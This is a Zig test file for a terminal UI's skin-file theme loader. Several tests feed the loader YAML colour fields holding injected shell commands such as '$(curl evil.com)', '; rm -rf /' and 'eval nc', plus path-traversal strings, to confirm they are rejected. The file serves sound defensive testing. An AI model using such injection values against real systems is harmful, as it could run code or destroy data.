/// Writes `content` as `skin.yaml` into a fresh temp dir and loads it through
/// the public `loadThemeFromDir` path. Caller owns the returned theme and the
/// returned `dir_path`; both must be cleaned up alongside `tmp_dir`.
fn loadFromContent(
    allocator: std.mem.Allocator,
    tmp_dir: *testing.TmpDir,
    content: []const u8,
) !ThemeColors {
    try tmp_dir.dir.writeFile(std.testing.io, .{ .sub_path = "skin.yaml", .data = content });

    const dir_path = try std.fmt.allocPrint(
        allocator,
        ".zig-cache/tmp/{s}",
        .{tmp_dir.sub_path},
    );
    defer allocator.free(dir_path);

    return loadThemeFromDir(allocator, "skin", dir_path);
}

test "theme loader rejects malicious shell commands" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    // Test malicious YAML with command injection
    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "$(curl evil.com)"
        \\    bgColor: "#414868; rm -rf /"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer deinitTheme(&theme);

    // Should fall back to default colors (not execute commands)
    // The unsafe values should be ignored
}

test "theme loader rejects path traversal" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "../../etc/passwd"
        \\    bgColor: "~/malicious"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer deinitTheme(&theme);
}

test "theme loader rejects command characters" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "#fff|ls"
        \\    bgColor: "#000;id"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer deinitTheme(&theme);
}

test "theme loader rejects dangerous commands" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "exec bash"
        \\    bgColor: "eval nc"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer deinitTheme(&theme);
}

test "theme loader accepts valid hex colors" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "#ffffff"
        \\    bgColor: "#000000"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer deinitTheme(&theme);

    // Should accept these valid hex colors
}

test "theme loader accepts valid named colors" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "white"
        \\    bgColor: "black"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer deinitTheme(&theme);
}

test "theme loader accepts valid color aliases" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "*primary-color"
        \\    bgColor: "*bg-dark"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer deinitTheme(&theme);
}

test "theme loader accepts default color" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "default"
        \\    bgColor: "default"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer deinitTheme(&theme);
}

test "theme loader rejects oversized files" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    // Create a buffer larger than 100KB
    const large_content = try allocator.alloc(u8, 101 * 1024);
    defer allocator.free(large_content);
    @memset(large_content, 'x');

    var theme = try loadFromContent(allocator, &tmp_dir, large_content);
    defer deinitTheme(&theme);

    // Should fall back to default theme
}

test "theme loader handles empty values safely" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const yaml_with_empty =
        \\k9s:
        \\  body:
        \\    fgColor: ""
        \\    bgColor: ""
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, yaml_with_empty);
    defer deinitTheme(&theme);
}

// --- tests from tests/theme_test.zig (rendering functions) ---

// Test color constants
const test_fg = "\x1b[38;2;207;201;194m";
const test_bg = "\x1b[49m";
const test_hi = "\x1b[38;2;247;118;142m";

test "theme: writeStringWithTheme with empty text" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Should not crash with empty text
    try writeStringWithTheme(&terminal, 0, 0, "", test_fg, test_bg);
}

test "theme: writeStringWithTheme with very long text" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Create very long text that would exceed buffer
    var long_text: [2048]u8 = undefined;
    @memset(&long_text, 'A');

    // Should truncate and not crash
    try writeStringWithTheme(&terminal, 0, 0, &long_text, test_fg, test_bg);
}

test "theme: writeStringWithTheme with normal text" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Should work fine with normal text
    try writeStringWithTheme(&terminal, 0, 0, "Hello, World!", test_fg, test_bg);
}

test "theme: writeStringWithTheme with special characters" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Should handle special characters
    try writeStringWithTheme(&terminal, 0, 0, "<ctrl-d>", test_fg, test_bg);
    try writeStringWithTheme(&terminal, 0, 0, "│─┤", test_fg, test_bg);
}

test "theme: writeShortcutWithHighlight with empty strings" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Should not crash with empty strings
    try writeShortcutWithHighlight(&terminal, 0, 0, "", "", "", test_hi);
}

test "theme: writeShortcutWithHighlight with normal text" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Should work fine with normal text
    try writeShortcutWithHighlight(&terminal, 0, 0, "", "a", "ttach", test_hi);
    try writeShortcutWithHighlight(&terminal, 0, 0, "sh", "o", "w node", test_hi);
}

test "theme: buffer size limits" {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var terminal = try Terminal.init(allocator);
    defer terminal.deinit();

    // Test with text that approaches buffer limit
    var medium_text: [500]u8 = undefined;
    @memset(&medium_text, 'B');

    try writeStringWithTheme(&terminal, 0, 0, &medium_text, test_fg, test_bg);

    // Test with text that exceeds buffer limit
    var huge_text: [5000]u8 = undefined;
    @memset(&huge_text, 'C');

    try writeStringWithTheme(&terminal, 0, 0, &huge_text, test_fg, test_bg);
}

test "the skin parser reaches the last mappings in file order" {
    // found_count increments once per MAPPING filled (17 of them) but was compared
    // against the number of UNIQUE yaml keys (14), because three keys each fill two
    // mappings: frame.menu.keyColor, frame.border.fgColor and
    // frame.status.completedColor. So the counter hit its limit three mappings early
    // and the line loop broke, and whatever sat LAST in file order never loaded.
    //
    // In every bundled skin that is the table cursor, which is why the selected row
    // looked identical in all 35 of them -- it always fell back to defaultTheme.
    //
    // This fixture is ordered to reproduce that exactly: the eleven keys above fill
    // 11 + 3 = 14 mappings, which was the old limit, so everything below the marker
    // used to be unreachable.
    const skin =
        \\k9s:
        \\  body:
        \\    fgColor: "#aaaaaa"
        \\    bgColor: "#111111"
        \\  frame:
        \\    title:
        \\      fgColor: "#bbbbbb"
        \\    menu:
        \\      keyColor: "#cccccc"
        \\    border:
        \\      fgColor: "#dddddd"
        \\    status:
        \\      addColor: "#eeeeee"
        \\      modifyColor: "#ff0000"
        \\      errorColor: "#00ff00"
        \\      completedColor: "#0000ff"
        \\  prompt:
        \\    fgColor: "#123456"
        \\    bgColor: "#654321"
        \\  views:
        \\    table:
        \\      cursorFgColor: "#abcdef"
        \\      cursorBgColor: "#fedcba"
    ;

    const a = std.testing.allocator;

    var defaults = try defaultTheme(a);
    defer deinitTheme(&defaults);

    var theme = try parseSkinFile(a, skin);
    defer deinitTheme(&theme);

    // The three that used to be dropped. Asserting DIFFERENT-FROM-DEFAULT is what
    // makes this bite; the pre-existing test asserted only main_fg.len > 0, which is
    // exactly the weak check that let the bug ship.
    try std.testing.expect(!mem.eql(u8, theme.selected_fg, defaults.selected_fg));
    try std.testing.expect(!mem.eql(u8, theme.selected_bg, defaults.selected_bg));

    // Sanity: an early mapping still loads, so this is not "everything changed".
    try std.testing.expect(!mem.eql(u8, theme.main_fg, defaults.main_fg));

    // And a double-mapped key must fill BOTH of its fields.
    try std.testing.expect(!mem.eql(u8, theme.hi_fg, defaults.hi_fg));
    try std.testing.expect(!mem.eql(u8, theme.key_highlight, defaults.key_highlight));
}
